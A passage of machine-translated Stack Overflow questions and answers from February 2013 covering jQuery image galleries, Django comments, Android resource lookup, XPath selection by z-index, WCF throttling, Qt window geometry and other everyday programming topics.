$(document).ready(function(){
    $('#thumb_1').click(function(){
        changeImgSrc($('#detailImage'), "/images/photos/1/small/draughtDesign_01.jpg");
    });
    $('#thumb_4').click(function(){
        changeImgSrc($('#detailImage'), "/images/photos/1/small/draughtDesign_02.jpg");
    });
    $('#thumb_5').click(function(){
        changeImgSrc($('#detailImage'), "/images/photos/1/small/draughtDesign_03.jpg");
    });
});

function changeImgSrc(targetImg, sourceMSallImgURL){
    var thbSource = sourceMSallImgURL;
    var lrgSource = thbSource.replace('/small/', '/large/');
    targetImg.attr("src", lrgSource);
}
</script>

<div class="galleryPhotos">
                <span class="galleryPic shadow"><img src="/images/photos/1/large/draughtDesign_01.jpg" id="detailImage" width="515" height="380" alt="photo description 1" /></span>
            <ul>
                <li><a href="javascript: return false;" title="photo description 1"><img src="/images/photos/1/small/draughtDesign_01.jpg" width="160" height="115" id="thumb_1" alt="photo description 1" /></a></li>
                <li><a href="javascript: return false;" title="photo description 2"><img src="/images/photos/1/small/draughtDesign_02.jpg" width="160" height="115" id="thumb_4" alt="photo description 2" /></a></li>
                <li><a href="javascript: return false;" title="photo description 3"><img src="/images/photos/1/small/draughtDesign_03.jpg" width="160" height="115" id="thumb_5" alt="photo description 3" /></a></li>
        </ul>
</div> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T12:33:37.990

用这个：

```
$('.galleryPhotos ul li a img').click(function(){
    changeImgSrc($('#detailImage'), $(this).attr("src"));
}); 
```

`thumbImages`或者为标签中的所有图像添加一个类（例如） `<li>`，然后

```
$('.thumbImages').click(function(){
    changeImgSrc($('#detailImage'), $(this).attr("src"));
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T12:12:06.793

像这样将类“thum_Img”添加到每个缩略图标签。

```
<img src="/images/photos/1/small/draughtDesign_01.jpg" width="160" height="115" id="thumb_1" alt="photo description 1" class="thum_Img"/> 
```

并执行以下操作...

```
$('.thumb_Img').click(function(){
        changeImgSrc($('#detailImage'), $(this).attr("src"));
    }); 
```

# ontology - 在 Web 上托管 OWL 本体以使用 Apache Stanbol

> ID：15111754
> 
> 赞同：2
> 
> 时间：2013-02-27T12:07:48.770
> 
> 标签：ontology, owl, apache-stanbol

我是本体开发的新手，我刚刚完成了我的第一个本体。现在我需要在 Apache Stanbol 中使用这个本体来执行一些 RDF 图的重构。

这是您在 Stanbol 中编写典型规则的方式：

`myRule[ has(<http//myont.org/hasFather>, ?x, ?y) . has(<http/myont.org/hasBrother>, ?y, ?z) -> has(<http//myont.org/hasUncle>, ?x, ?z) ]`

我猜我将不得不在一些在线的地方托管我的本体，以使规则生效。现在，基本 URI 指向[http://www.example.org/ontologies/EDXL.owl#](http://www.example.org/ontologies/EDXL.owl#)，这是一个虚构的地址。

我知道 URI 不需要指向物理地址，但它会与 Stanbol 一起使用吗？如果是这种情况，我该如何托管 .owl 文件。任何网络服务器都会这样做（即公共WWW）吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T13:09:52.540

As you mentioned, URIs do not necessarily need to point to actual resolvable pages (yet it's better if they do). So the rule engine should understand the OWL file even if it is not available online.

If you want to expose the OWL file anyway, any web server should be able to do it, just put the file somewhere accessible (`public` should work out of the box). When you use your browser to access it you should be able to see the ontology directly displayed (thanks to the special MIME type `text/turtle`).

Example: If you go to the [URI](http://www.w3.org/2002/07/owl#Thing) of the OWL concept `Thing` you should see the whole ontology in your browser.

# asp.net-mvc - 取消正在执行的动作

> ID：15111757
> 
> 赞同：3
> 
> 时间：2013-02-27T12:07:54.773
> 
> 标签：asp.net-mvc, cancellation, cancellationtokensource

我有一个带有过滤器和 2 个按钮的页面：生成和取消。因此，当我单击“生成”按钮时，我会转到“结果”操作。当我单击取消按钮时，我想取消我之前在代码和数据库中的请求。

一些代码（我使用 .NET 4.0、MVC 4）

结果控制器.cs：

```
public Task<PartialViewResult> Results(int id)
        {
            CancellationTokenSource tokenSource = new CancellationTokenSource();

            System.Web.HttpContext.Current.Application.Add("token", tokenSource);

            Task<PartialViewResult> task = Task.Factory.StartNew(() => {
                return ResultsRepository.PrepareViewModel(id);
            }, tokenSource.Token).ContinueWith(x => PartialView("Results", x.Result), TaskContinuationOptions.OnlyOnRanToCompletion);

            System.Web.HttpContext.Current.Application.Add("task", task);

            return task;
        }

public JsonResult CancelResultsByMonthGeneration(int id, DateTime selectedMonth)
        {
            CancellationTokenSource tokenSource = System.Web.HttpContext.Current.Application["token"] as CancellationTokenSource;
            Task<PartialViewResult> task = System.Web.HttpContext.Current.Application["task"] as Task<PartialViewResult>;

            try {
                if (tokenSource != null) {
                    tokenSource.Cancel();
                    task.Wait();
                }
            } 
            finally {
                task.Dispose();
                tokenSource.Dispose();
            }

            return Json(new { Success = true }, JsonRequestBehavior.AllowGet);
        } 
```

结果存储库.cs

```
public ResultsViewModel PrepareViewModel(int id)
            {
                // use Entity Framework to call stored procedure
            } 
```

所以，预期的结果：如果我取消报告生成请求应该被取消，没有数据显示。

主要问题：我可以使用方法 tokenSource.Cancel() 取消请求吗？或者我应该使用 ThrowIfCancellationRequested() 方法（在哪里？）

# django - 姜戈 1.5。评论框架中的用户属性

> ID：15111760
> 
> 赞同：0
> 
> 时间：2013-02-27T12:08:03.243
> 
> 标签：django, model, django-comments

我在 Django 1.5 中使用 MyUser 模型（电子邮件作为登录名）：

```
class MyUserManager(BaseUserManager):
 def create_user(self, email, password=None):
    """
    Creates and saves a User with the given email, date of
    birth and password.
    """
    if not email:
        raise ValueError('Users must have an email address')

    user = self.model(
        email=MyUserManager.normalize_email(email),
       # date_of_birth=date_of_birth,
    )

    user.set_password(password)
    user.save(using=self._db)
    return user

def create_superuser(self, email, password):
    """
    Creates and saves a superuser with the given email, date of
    birth and password.
    """
    user = self.create_user(email,
        password=password,
        #date_of_birth=date_of_birth
    )
    user.is_admin = True
    user.save(using=self._db)
    return user

 class MyUser(AbstractBaseUser):
   email = models.EmailField(
    verbose_name='email address',
    max_length=255,
    unique=True,
    db_index=True,
)
last_name=models.CharField(max_length=30)
first_name=models.CharField(max_length=30)
second_name=models.CharField(max_length=30, blank=True)
about=models.TextField(blank=True)
is_active = models.BooleanField(default=True)
is_admin = models.BooleanField(default=False)  

objects = MyUserManager()

USERNAME_FIELD = 'email'
REQUIRED_FIELDS = ['last_name','first_name','second_name',]

def get_full_name(self):
    # The user is identified by their email address
    return self.email

def get_short_name(self):
    # The user is identified by their email address
    return self.email

def __unicode__(self):
    return self.email

def has_perm(self, perm, obj=None):
    "Does the user have a specific permission?"
    # Simplest possible answer: Yes, always
    return True

def has_module_perms(self, app_label):
    "Does the user have permissions to view the app `app_label`?"
    # Simplest possible answer: Yes, always
    return True

@property
def is_staff(self):
    "Is the user a member of staff?"
    # Simplest possible answer: All admins are staff
    return self.is_admin 
```

设置.py：

```
AUTH_USER_MODEL = 'app.MyUser' 
```

我激活了 django 评论框架：

设置.py：

```
'django.contrib.comments', 
```

网址：

```
(r'^comments/', include('django.contrib.comments.urls')), 
```

模板（只有授权用户可以添加评论）：

```
<h2>Add a comment:</h2> {%  get_comment_form for post as form %} 
<form action="{% comment_form_target %}" method="post" > {% csrf_token %}   
{% if next %}
<div><input type="hidden" name="next" value="{{ next }}" /></div>
{% endif %}     
{{form.content_type}}{{form.object_pk}}{{form.timestamp}}{{form.security_hash}}
Comment:<br />
{{form.comment}}       
<input type="hidden" name="next" value="{{ request.get_full_path }}" /> 

<input type="submit" name="submit" class="submit-post" value="Post"  />
<input type="submit" name="preview" class="submit-preview" value="Preview" />
</form> 

{% get_comment_count for post as comment_count %}   
<h2>Comments: [{{ comment_count }}]</h2> 
{% get_comment_list for post as comment_list %} 
{% for comment in comment_list|dictsortreversed:"submit_date" %}
<dl id="comments">      
{{ comment.email }} {{ comment.submit_date|date:"d.m.Y G:i" }}
<dd>
{{ comment.comment|striptags|urlizetrunc:20|linebreaksbr }}
</dd>
</dl>
{% endfor %} 
```

如何获取用户的模型字段“first_name”等？comment.email 和 comment.name 给了我“电子邮件”字段，comment.first_name 什么也没给我。谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T15:19:10.083

根据[内置的评论模型](https://docs.djangoproject.com/en/dev/ref/contrib/comments/models/)`{{ comment.user }}`文档，您可以通过模板访问用户发布的评论。因此，您可以访问这样的`MyUser`模型字段`{{ comment.user.email }}`或`{{ comment.user.first_name }}`等。

# eclipse - 优化 Java Resin 项目前端开发的工作流程

> ID：15111761
> 
> 赞同：2
> 
> 时间：2013-02-27T12:08:04.470
> 
> 标签：eclipse, ide, workflow, frontend, resin

几个月后我开始了一份新工作，我在一家公司担任前端开发人员，到目前为止，每个人都在使用经典的开发模式，但目标是转向新的 ajax/rest 服务方法，这就是我所做的。

在我们的本地开发环境中，我们的应用程序在 Resin 上运行，Resin 在 Eclipse 中运行并作为 war 文件部署到 C:\Resin\resin-pro-4.0.27\webapps

我的问题是我主要处理 css html 和 js 文件、静态资源，所以我不需要重新启动 Resin 并等待 15 秒（当它没有崩溃时）来查看我更改的每一小段代码的效果。

另一个问题是我需要在外部编辑器中编辑一些文件（js 的崇高文本，LESS 的 Crunch）；我设法让 Eclipse 打开外部编辑器，但即使使用“使用本机挂钩或轮询刷新”构建选项，也需要一段时间才能意识到文件已更改并重新启动 Resin。

我还尝试在 C:\Resin\resin-pro-4.0.27\webapps\appname 中进行解压战争，但即使在那里，您也需要一分钟才能看到浏览器上的更改（是否正在进行一些缓存服务器？我可以禁用它吗？）

我欢迎任何建议，因为这一切真的损害了我的工作效率

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-09-06T11:48:07.290

里面`Resin.xml` `<host><web-app>`添加：

```
 <cache-mapping url-pattern="*.js" expires="0s"/>
  <cache-mapping url-pattern="*.css" expires="0s"/>
  <cache-mapping url-pattern="*.htm" expires="0s"/>
  <cache-mapping url-pattern="*.html" expires="0s"/> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-12-23T15:25:46.843

这曾经对我有用（在resin.xml中）

```
<!--
 - For production sites, change dependency-check-interval to something
 - like 600s, so it only checks for updates every 10 minutes.
-->
<dependency-check-interval>2s</dependency-check-interval> 
```

还要检查resin.properties 以了解较新版本中的变量定义。但是，我目前在没有完全重新部署的情况下获取更改时遇到问题。

# java - GWT 确认消息框

> ID：15111771
> 
> 赞同：-1
> 
> 时间：2013-02-27T12:08:28.597
> 
> 标签：java, gwt, messagebox, dialog

我需要某种 ConfirmMessageBox 来实现 gwt。gwt 是否为此准备了一些东西，或者是扩展对话框的唯一方法？

基本思想是一个带有问题的框“你想保存这个当前状态吗？” 和 2 个按钮“是”（保存数据）和“否”（拒绝数据）。

感谢您的任何帮助或新想法

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T12:14:45.567

我记得没有现成的实现。你可以试试 Ext_GWT。不过，自己动手做起来并不复杂，扩展DialogBox，添加两个按钮，我就是这样做的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-27T13:38:41.507

除了`extends DialogBox`没有其他选项。您可以通过处理`panel with masking`（制作自定义 css）来管理它，但它比扩展更混乱`DialogBox`。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-27T16:59:27.197

Check out `Window.confirm(String message)` which returns a boolean to indicate OK/Cancel

# css - 在背景颜色之上应用渐变 CSS

> ID：15111772
> 
> 赞同：0
> 
> 时间：2013-02-27T12:08:29.003
> 
> 标签：css, gradient, opacity

我想要一个纯色的背景颜色，并在它上面有一个具有一定不透明度的渐变。这样，它看起来像是一种背景颜色，上面有渐变效果。

这是我的html：

```
<article>
    <a href="" class="article">
      <h2>Title<i></i></h2>
      <img src="images/media-examples/pic1.jpg">
    </a>
</article> 
```

我想将此应用于标题以创建如下内容：

![在此处输入图像描述](../Images/34c6186b6313063f0cd2aef91c47cb90.png)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-27T12:17:19.873

从示例来看，您不需要渐变。您只需要一个带有不透明度的覆盖元素。所以

HTML

```
<div id="element">
 <div id="overlay">
 <h2>H2 Title</h2>
 </div>
</div> 
```

CSS

```
#element {background:url('image.jpg');}
#overlay {background:rgba(0, 0, 0, 0.5);} 
```

我不会详细介绍，因为它表明你想要一个教程，真的你需要尝试它，然后在出错时寻求帮助。尝试搜索互联网，网上会有很多教程。

**更新** 要使用您现有的 HTML，请尝试应用此 CSS

```
article {width:300px;}
article img {position:fixed; top:0; border:3px solid #253d8e; z-index:99;}
article h2 {z-index:999; position:fixed; top:0; color:#fff; background:rgba(0, 0, 0, 0.5); width:290px; display:inline-block;margin:0; padding-top:10px; padding-bottom:10px; padding-left:10px;} 
```

您将需要更新它以满足您的需求，但应该给您一个想法。看到它[在 jsfiddle 上工作](http://jsfiddle.net/8nhGA/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T12:21:37.827

我会在具有不透明度背景的图像上添加另一个元素......这样您就可以轻松控制所有属性。

您还可以将两个背景应用于同一元素或使用伪元素，如下所示：http: [//nicolasgallagher.com/multiple-backgrounds-and-borders-with-css2/](http://nicolasgallagher.com/multiple-backgrounds-and-borders-with-css2/)

编辑：抱歉，Tim 使用相同但更详细的覆盖元素答案只是稍微快了一点 =) 但现在我只想对其他两个建议有所了解；-)

# android - 获取资源（）错误

> ID：15111774
> 
> 赞同：0
> 
> 时间：2013-02-27T12:08:43.080
> 
> 标签：android, image, resources

为了这

```
// Look for the image
        int identifier = Context.getResources().getIdentifer(Index.THUMBNAIL, "drawable", getPackageName()); 
```

我得到了错误

此行有多个标记 - 未为 MenuAdapter 类型定义方法 getPackageName() - 无法从类型 Context 对非静态方法 getResources() 进行静态引用 - 无法解析上下文

我真的不知道如何解决这个问题。

这是我的课。目标是通过 .setRecourse(int) 更改 ImageView 中的图像

```
 package com.example.whs;

import java.util.ArrayList;
import java.util.HashMap;

import android.app.Activity;
import android.content.Context;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.BaseAdapter;
import android.widget.ImageView;
import android.widget.TextView;

public class MenuAdapter extends BaseAdapter{
    // Define variables
    ArrayList<HashMap<String, String>> data;
    Activity activity;
    private LayoutInflater inflater=null;

    public MenuAdapter(Activity a, ArrayList<HashMap<String, String>> d) {
        activity = a;
        data = d;
        inflater = LayoutInflater.from (a);
    }

    @Override
    public int getCount() {
        return data.size();
    }

    @Override
    public Object getItem(int position) {
        // TODO Auto-generated method stub
        return position;
    }

    @Override
    public long getItemId(int position) {
        // TODO Auto-generated method stub
        return position;
    }

    @Override
    public View getView(int position, View convertView, ViewGroup parent) {
        View vi=convertView;
        if(convertView==null)
            vi = inflater.inflate(R.layout.list_row, null);

        // Focus on the parts that have to be changed
        TextView title = (TextView)vi.findViewById(R.id.title); // title
        TextView subtitle = (TextView)vi.findViewById(R.id.subtitle); // subtitle
        ImageView thumb_image=(ImageView)vi.findViewById(R.id.list_image); // thumb image

        //Get the info from the hashmap with the arraylist position
        HashMap<String, String> item = new HashMap<String, String>();
        item = data.get(position);

        // Look for the image
        int identifier = getApplicationContext().getResources().getIdentifer(Index.THUMBNAIL, "drawable", MenuAdapter.class.getPackage().getName());;

        // Setting all values in listview
        title.setText(item.get(Index.TITLE));
        subtitle.setText(item.get(Index.SUBTITLE));
        thumb_image.setImageResource(identifier);
        return vi;
    }

} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-27T12:11:26.860

编辑：因为你有一个活动参考，你可以使用它

```
activity.getResources().getIdentifer(Index.THUMBNAIL, "drawable", getPackageName()) 
```

尝试这样调用

```
 int identifier = getActivity().getResources().getIdentifer(Index.THUMBNAIL, "drawable", getPackageName()) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-27T12:16:41.663

试试下面的代码：

```
 Context.getResources().getIdentifer(Index.THUMBNAIL, "drawable",
 YourActivityName.class.getPackage().getName()); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-27T12:31:23.157

如果 getApplicationContext() 不起作用，这就是我的做法：

```
int id = getResources().getIdentifier("packagename:drawable/" + drawableresourcename, null, null);
image.setImageResource(id); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2018-01-17T19:24:31.450

只需`context`在调用之前添加`getResources()`：`context.getResources()`

# html - 使用 XPath 选择具有最高 z-index 的元素

> ID：15111775
> 
> 赞同：4
> 
> 时间：2013-02-27T12:08:43.107
> 
> 标签：html, xpath, selenium

在我的 Selenium 应用程序中，我尝试选择具有最高`z-index`. 该值不是在元素本身中定义的，而是在祖先节点上定义的（嵌套级别未知）。此外，如果使用`display: none`它的祖先不可见，则不应返回。

示例 HTML：

```
 <div class="container" style="z-index: 10">
    <div style="display: none">
      <!-- this should not be selected because it is invisible (and the z-index is lower than the others) -->
      <div myattr="example"></div>
    </div>
  </div>
  <div class="container" style="z-index: 100">
    <div>
      <!-- this should not be selected because the z-index is lower than the others -->
      <div myattr="example"></div>
    </div>
  </div>
  <div class="container" style="z-index: 1000">
    <div>
      <!-- this should be selected because it is visible and has the highest z-index -->
      <div myattr="example"></div>
    </div>
  </div> 
```

目前我有一个正则表达式，它选择所有`myattr="example"`没有祖先的元素`display: none`：

```
//div[@myattr='example'
and not(ancestor::div[contains(@style,'display:none')])
and not(ancestor::div[contains(@style,'display: none')])] 
```

我需要一个附加条件来选择具有最高 z-index 的元素，可以说是在其他元素之上可见。对于每个找到的节点，必须查看所有祖先，直到找到具有特定类的节点（`container`在本例中）。然后只返回具有最高 z-index 祖先的元素。

XPath 甚至可以做到这一点吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T16:03:05.507

我真的很努力，但我认为你不能用一个 XPath 1.0 表达式来实现这一点。你可以靠近，但不完全在那里。

您需要使用其他一些逻辑。好像有一千种不同的方法。

例如，获取所有`container`元素，对它们进行排序`z-index`并测试它们的`myattr="example"`后代的可见性：

```
// Gets all containers - could also be Gets all elements containing z-index
List<WebElement> containers = driver.findElements(By.className("container"));

// Sorts the containers in an descending order by their z-indexes
Collections.sort(containers, Collections.reverseOrder(new Comparator<WebElement>() {
    @Override
    public int compare(WebElement o1, WebElement o2) {
        return getZindex(o1) - getZindex(o2);
    }
    private int getZindex(WebElement elem) {
        String zindex = elem.getAttribute("style").toLowerCase().replace("z-index: ", "");
        return Integer.parseInt(zindex);
    }
}));

// look for a visible candidate to return as a result
for (WebElement container : containers) {
    WebElement result = container.findElement(By.cssSelector("*[myattr='example']"));
    if (result.isDisplayed()) {
        return result;
    }
}
throw new IllegalStateException("No element found."); 
```

* * *

**编辑：**在你接受这个答案后，我回到了这个问题并想出了一个 XPath 1.0 解决方案。它丑得要命，性能很差，我无法验证它的正确性（它适用于您的示例和我尝试过的其他一些示例），因此我建议您使用上面的 WebDriver 方法。无论如何，我会分享它：

Copypastable oneliner：

```
//div[@myattr='example' and not(ancestor::div[contains(@style,'display: none')])]/ancestor::div[@class='container' and substring-after(@style,'z-index:') > substring-after(../div[not(descendant::div[contains(@style,'display: none')])]/@style,'z-index:')] 
```

格式化版本：

```
//div
    [
        @myattr='example'
        and not(ancestor::div[contains(@style,'display: none')])
    ]
    /ancestor::div
        [
            @class='container'
            and substring-after(@style,'z-index:')
                > substring-after(
                    ../div[not(descendant::div[contains(@style,'display: none')])]/@style,
                    'z-index:')
        ] 
```

以及对人类语言的免费翻译（不是字面的！）：

```
SELECT A VISIBLE <div @myattr='example'> NODE
//div
    [
        @myattr='example'
        and not(ancestor::div[contains(@style,'display: none')])
    ]
    THAT HAS A <div @class='container'> ANCESTOR
    /ancestor::div
        [
            @class='container'
            WHOSE z-index IS GREATER THAN z-index...
            and substring-after(@style,'z-index:')
                > substring-after(
                    ...OF ALL VISIBLE SIBLINGS
                    ../div[not(descendant::div[contains(@style,'display: none')])]/@style,
                    'z-index:')
        ] 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-27T14:31:12.797

我假设你知道 z-index 的最大值，在这种情况下 xpath 是

```
"//div[contains(@style,'1000')]/div[not(contains(@style,'none'))]/div" 
```

否则使用下面的 xpath 获取 div 的所有样式属性

```
List<WebElement> divTags=driver.findElements(By.xpath("//div[not(contains(@style,'none'))]/parent::div[contains(@style,'z-index')]"))
for(WebElement ele:divTags)
{
    ele.getAttribute("style");
} 
```

*   将 z-indexes 存储在某个变量中
*   解析存储的 z 索引并单独获取数字
*   使用一些逻辑找到其中最大的数字
*   做上述所有事情都会保留该元素的索引。
*   找到最高 z-index 后，获取该元素的索引
*   使用该索引构造 xpath。

我希望以上逻辑能帮助您实现目标。

# events - 是否可以以编程方式打开 CKEditor 插入图像组件？

> ID：15111777
> 
> 赞同：1
> 
> 时间：2013-02-27T12:08:44.730
> 
> 标签：events, ckeditor, eventtrigger, insert-image

例如，如果我有一个现成的 CKEDITOR 实例，并且在同一页面上我有一个图片列表，带有以下标记：

```
<div class="galleryPictures">
    <a href="#image-id-1" data-id="1" data-img-src="/pictures/image-1.jpg" class="galleryPicture">
        <img src="/pictures/image-1.jpg" />
    </a>
    <a href="#image-id-2" data-id="2" data-img-src="/pictures/image-2.jpg" class="galleryPicture">
        <img src="/pictures/image-2.jpg" />
    </a>
    <a href="#image-id-3" data-id="3" data-img-src="/pictures/image-3.jpg" class="galleryPicture">
        <img src="/pictures/image-3.jpg" />
    </a>
</div> 
```

我有以下委托给这些`a.galleryPicture`项目的jQuery点击处理程序：

```
$(document).ready(function() {
    $('.galleryPictures').on('click', 'a.galleryPicture', function() {
        // when this accours I would like to open CKEditor's
        // Insert-Image Component, and to get the "url" field filled with
        // $(this).data('img-src'); value
    });
}); 
```

* * *

**是否可以以编程方式触发/打开插入图像？**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T13:05:53.377

找到了。可能对其他人有帮助：

通过对 Firebug 的简单检查，我发现`<a>`单击时触发 Insert-Image 组件的打开在其`onclick`属性中包含此函数调用：

```
CKEDITOR.tools.callFunction(51,{});
// second argument is {} (an empty js-object), it the original the <a> onclick it was like this:
// CKEDITOR.tools.callFunction(51, this); meaning it was sending the instance of that element 
```

在此调用之后，可以执行以下操作：

```
CKEDITOR.tools.callFunction(51,{});

// a failsafe if jQuery doesn't find the specified element after the function is executed
setTimeout(function() {
    $('#cke_69_textInput').val('someImageUrl');
}, 50); 
```

# java - Errai - JSONException: 错误 > 解析 JSON: SyntaxError: Unexpected token <

> ID：15111781
> 
> 赞同：0
> 
> 时间：2013-02-27T12:09:00.827
> 
> 标签：java, gwt, errai

运行我的使用 Errai-UI 的 GWT 应用程序时

我收到此错误：

> 警告：将元素类型 [INPUT] 替换为 [BUTTON] 类型将 @Replace [data-field=username] 元素 [] 与组件 com.google.gwt.user.client.ui.TextBox [] 合成 @Replace [data-field =password] element [] with Component com.google.gwt.user.client.ui.TextBox [] com.google.gwt.json.client.JSONException: Error parsing JSON: SyntaxError: Unexpected token <

我已经添加`RootPanel.get().clear()`了，`@PostConstruct`但仍然收到错误。

```
 @PostConstruct
   public void setup()
   {
       // Fix for Unexpected token JSONException being thrown
       RootPanel.get().clear();

       login.setText("Login");
       login.addClickHandler(new ClickHandler() {
            @Override
            public void onClick(ClickEvent event) {
                Window.alert("Logging in");
            }
       });
       RootPanel.get("rootPanel").add(this);
   } 
```

我会错过什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T17:22:40.157

看起来您的 HTML5 模板中可能存在语法错误。我会验证它是否可以被验证为正确的 HTML5 而不会出现语法错误。这将解释浏览器中的模板解析错误（这就是这里发生的情况。）

# asp.net - 增加 WCF 服务上的加载和并发用户

> ID：15111783
> 
> 赞同：0
> 
> 时间：2013-02-27T12:09:04.230
> 
> 标签：asp.net, wcf, iis-7

我有一个内部网站，它多次调用托管在 IIS 7 Windows 2008 R2 服务器中的 WCF 服务。

在 50-75 个用户使用它的重负载期间，它在 WCF 调用中返回 FaultException。我非常怀疑这是因为用户加载，因为我们使用同一个网站将近一年，而且我们之前没有遇到同样的错误。某些调用可能需要 2 或 3 秒才能执行。

因此，我在主机服务的 web.config 文件中添加了以下几行。我需要在任何地方添加任何东西吗？我也需要在客户网站上做任何事情吗？谢谢。

```
<serviceBehaviors>
<behavior>
    <serviceThrottling 
    maxConcurrentCalls="100" 
    maxConcurrentSessions="100" 
    maxConcurrentInstances="100"
      />

</behavior>
</serviceBehaviors> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T12:46:34.550

在任意更改配置之前，我会寻找它失败的原因。

由于您的调用需要 2/3 秒才能返回，我们可以放心地假设您在给定时间创建了超过 10 个实例（默认为 10 个）。发生这种情况时，呼叫会排队，并且如果您的负载没有下降，那么每个呼叫都可以得到答复，那么您将遇到问题。

您可以通过查看[WCF 提供的性能计数器](http://msdn.microsoft.com/en-us/library/ms735098.aspx)进行诊断，特别是与 ServiceModelService 4.0.0.0 相关的实例计数器。

如果这是问题（看起来可能是），那么您可以采取行动并增加实例数量。但是，最终的解决方法应该是减少响应时间，否则您只会推迟扩展带来的问题。

# android - 在 Android 中下载 Google Drive 图片的最有效方法是什么？

> ID：15111785
> 
> 赞同：2
> 
> 时间：2013-02-27T12:09:07.600
> 
> 标签：android, google-drive-api, inputstream, outputstream, google-api-java-client

我正在编写一个需要从 Google Drive 下载图像的应用程序。我目前正在使用以下代码执行此操作：

```
protected void downloadFromDrive(Context context) {
    InputStream input = null;
    FileOutputStream output = null;
    try {
        HttpRequest request = GoogleDriveWorker.get(context)
        .getDrive()
        .getRequestFactory()
        .buildGetRequest(new GenericUrl(getUri()));
        input = request.execute().getContent();
        output = context.openFileOutput(getImageFilename(), Context.MODE_PRIVATE);
        int bufferSize = 1024;
        byte[] buffer = new byte[bufferSize];
        int len = 0;
        while ((len = input.read(buffer)) != -1) {
            output.write(buffer, 0, len);
        }
    } catch (UnrecoverableKeyException e) {
        e.printStackTrace();
    } catch (NoSuchAlgorithmException e) {
        e.printStackTrace();
    } catch (CertificateException e) {
        e.printStackTrace();
    } catch (KeyStoreException e) {
        e.printStackTrace();
    } catch (FileNotFoundException e) {
        e.printStackTrace();
    } catch (IOException e) {
        e.printStackTrace();
    } finally {
        try {
            if(output!=null)
                output.close();
            if(input!=null)
                input.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}

public String getUri() {
    return mUri;
} 
```

`GoogleDriveWorker`只是一个使用我们正在使用的凭据获取谷歌驱动器的类。无论如何，我能找到的大多数示例都使用这种基本结构从 an 下载文件`InputStream`并将其放入 an `OutputStream`，但下载速度相当慢。

首先，我可以通过使用比一次同步缓冲一千字节更复杂的方法`InputStream`来加速它吗？`OutputStream`令我震惊的是，我应该尝试`InputStream`在不同的线程上读取，并`OutputStream`使用块队列将输出到千字节块变得可用。将读取代码和写入代码捆绑在一起看起来很笨拙，而且它们肯定会互相拖慢。

其次，改变缓冲区大小会影响数据速率吗？一千字节似乎很小，但在移动连接上可能并没有那么小。再一次，块越大，读/写循环的每个部分的等待就越大。是否值得考虑使用不同大小的缓冲区？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-28T10:25:48.670

我认为没有比您所做的更复杂的方法了。您可能可以用更大的块（例如几百 KB）进行一些实验并测量 tiem。我认为它更快。

还要检查有关块大小的驱动器/java-api-client-library 文档。我认为对此有一些解释，但我对此不是 100% 确定的。

# qt - QWidget::save/restoreGeometry 如果最大化会丢失窗口大小 - 错误或功能？

> ID：15111788
> 
> 赞同：4
> 
> 时间：2013-02-27T12:09:20.763
> 
> 标签：qt, window, geometry

我正在编写 Qt（Ubuntu 12.04 上的 4.8.1）应用程序，它在会话之间存储它的主窗口几何图形。我注意到如果小部件最大化，qt 不会存储它的非最大化几何。显然，如果我的应用程序自上次最大化后关闭/启动，我希望我的应用程序返回到它的非最大化大小。在

1.  主窗口未最大化且具有几何 X；
2.  最大化主窗口；
3.  保存窗口几何图形（使用 QWidget::saveGeometry）到配置文件；
4.  关闭我的申请；
5.  重新开始；
6.  从配置文件加载几何
7.  恢复（取消最大化？；）

在步骤 6 之后窗口最大化（如预期的那样），但在步骤 7 之后它返回到某个内部默认大小（即在 QtCreator 中设计表单时设置的一组），而不是最后一个未最大化的几何 X。

这是期望的行为吗？或者在 qt 中实现是不可能/困难的？

是因为最大化时，窗口管理器会记住非最大化的大小而不是qt（至少在linux上）？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-27T12:39:05.180

当窗口最大化开始时，您不需要保存几何图形。

要获得所需的功能，只需按如下方式修改您的步骤：

1.  主窗口未最大化且具有几何 X；
2.  将几何 X 也保存为窗口的左上角为`QPoint`Y
3.  最大化主窗口；
4.  不要保存几何图形（您可以在保存到配置文件之前计算窗口状态是否最大化**）**`QWidget::isMaximized()`。将新的`isMaximised`状态值保存到配置文件中。
5.  关闭我的申请；
6.  重新开始；
7.  在你打电话之前`window->show()`申请一个`window->resize(lastQSizeSavedinSettingsofNonMaximisedState)`和一个`window->move(lastQPointSavedinSettingsofNonMaximisedState)`
8.  现在检查`isMaximised`配置中的状态值，如果为真，只需调用[QWidget::showMaximized()](http://qt-project.org/doc/qt-4.8/qwidget.html#showMaximized)否则只是`QWidget::show()`
9.  现在，当您恢复窗口大小时，您应该拥有所需的功能:)

处理窗口大小/状态时要记住的事情。

始终提供备用几何和位置，以防应用程序启动时最后保存的位置超出范围，并且您尝试恢复的值不再位于屏幕范围内。（这有助于满足某人更改分辨率/显示器计数/显示器位置/虚拟桌面的情况）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-11-15T09:05:46.247

> 4\. 不要保存几何图形（您可以在保存到配置文件之前使用 QWidget::isMaximized() 计算窗口状态是否最大化）。将新的 isMaximized 状态值保存到配置文件中。

